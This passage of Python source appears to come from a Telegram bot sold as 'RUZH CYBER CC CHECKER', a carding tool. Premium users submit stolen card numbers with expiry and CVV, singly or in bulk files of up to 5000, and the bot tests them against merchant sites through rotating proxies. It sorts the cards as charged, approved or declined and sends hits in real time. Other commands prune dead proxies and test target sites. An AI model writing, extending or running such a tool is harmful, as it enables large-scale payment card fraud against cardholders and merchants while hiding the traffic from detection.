<blockquote>• Total: {total_keys}
• Active: {active_keys}
• Expired: {expired_keys}</blockquote>
<b>🌐 Sites:</b>
<blockquote>• Total: {len(sites)}</blockquote>
<b>🔌 Proxies:</b>
<blockquote>• Total: {len(proxies)}</blockquote>
<b>👑 Admins:</b>
<blockquote>• {', '.join(ADMIN_IDS)}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER v8.0</b>"""
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("🚫 You are banned!"))
        return
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied. Please redeem a key using /redeem KEY"), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ No sites or proxies available. Please add sites to sites.txt and proxies to proxy.txt"), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"<b>⚡ Checking: <code>{card}</code></b>"), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_emoji, status_text = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        elif result['status'] == 'Approved':
            status_emoji, status_text = "🔥", "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
        elif result['status'] == 'Declined':
            status_emoji, status_text = "❌", "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
        else:
            status_emoji, status_text = "💀", "𝐃𝐞𝐚𝐝"

        final = f"""<b>⚡💳 ㅤ#ℛ𝓊𝓏𝒽𝒞𝓎𝒷ℯ𝓇  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍</b>
<pre>BIN: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot: RUZH CYBER</b>"""

        await status_msg.edit(premium_emoji(final), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("🚫 You are banned!"))
        return
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied. Please redeem a key using /redeem KEY"))
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file."))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."))
        return

    if not load_sites() or not load_proxies():
        await event.reply(premium_emoji("❌ No sites or proxies available. Please add sites to sites.txt and proxies to proxy.txt"))
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing file..."))
    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)
    os.remove(file_path)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found."))
        return

    if len(cards) > 5000:
        cards = cards[:5000]
        await status_msg.edit(premium_emoji(f"⚠️ Limiting to 5000 cards."))

    total = len(cards)
    await status_msg.edit(premium_emoji(f"🔄 Checking {total} cards..."))

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    results = {
        'charged': [],
        'approved': [],
        'declined': [],
        'dead': [],
        'total': total,
        'checked': 0,
        'start_time': time.time()
    }

    try:
        queue = asyncio.Queue()
        for c in cards:
            queue.put_nowait(c)

        last_update = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                state = active_sessions.get(session_key)
                if not state:
                    break
                while state.get('paused', False):
                    await asyncio.sleep(1)
                    state = active_sessions.get(session_key)
                    if not state:
                        return

                try:
                    card = queue.get_nowait()
                except:
                    break

                sites = load_sites()
                proxies = load_proxies()
                if not sites or not proxies:
                    break

                res = await check_card_with_retry(card, sites, proxies, max_retries=1)
                
                async with lock:
                    results['checked'] += 1
                    if res['status'] == 'Charged':
                        results['charged'].append(res)
                        await send_realtime_hit(user_id, res, 'Charged', 'ruzh')
                    elif res['status'] == 'Approved':
                        results['approved'].append(res)
                        await send_realtime_hit(user_id, res, 'Approved', 'ruzh')
                    elif res['status'] == 'Declined':
                        results['declined'].append(res)
                    else:
                        results['dead'].append(res)

                queue.task_done()

                now = time.time()
                if now - last_update[0] >= 1.0:
                    last_update[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, results, results['checked'])
                        except:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(3)]

        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, results, results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Error: {e}"))

    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, results)

# ─── PROXY COMMANDS ───

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("🚫 You are banned!"))
        return
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt. Please add proxies."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."))
    alive, dead = [], []

    for i in range(0, len(proxies), 50):
        batch = proxies[i:i+50]
        results = await asyncio.gather(*[test_proxy(p) for p in batch])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
        await status_msg.edit(premium_emoji(f"🔥 Checked: {len(alive)+len(dead)}/{len(proxies)}\nAlive: {len(alive)}\nDead: {len(dead)}"), parse_mode='html')

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive:
            await f.write(f"{p}\n")

    await status_msg.edit(premium_emoji(f"✅ Done! Alive: {len(alive)}, Removed: {len(dead)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/fuck'))
async def site_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("🚫 You are banned!"))
        return
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied."))
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ No sites or proxies. Please add sites to sites.txt and proxies to proxy.txt"))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))
    alive, dead = [], []

    for i in range(0, len(sites), 10):
        batch = sites[i:i+10]
        fresh_proxies = load_proxies()
        results = await asyncio.gather(*[test_site(s, random.choice(fresh_proxies)) for s in batch])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['site'])
        await status_msg.edit(premium_emoji(f"🔥 Checked: {len(alive)+len(dead)}/{len(sites)}\nAlive: {len(alive)}\nDead: {len(dead)}"), parse_mode='html')

    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive:
            await f.write(f"{s}\n")

    await status_msg.edit(premium_emoji(f"✅ Done! Alive: {len(alive)}, Removed: {len(dead)}"), parse_mode='html')

# ─── CALLBACKS ───

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit(premium_emoji("🛑 Stopped by user."))

# ─── RUN ───

print("✅ RUZH CYBER BOT STARTED")
print("⚡ Bot: RUZH CYBER CC CHECKER v8.0")
print(f"👑 Admins: {', '.join(ADMIN_IDS)}")
bot.run_until_disconnected()
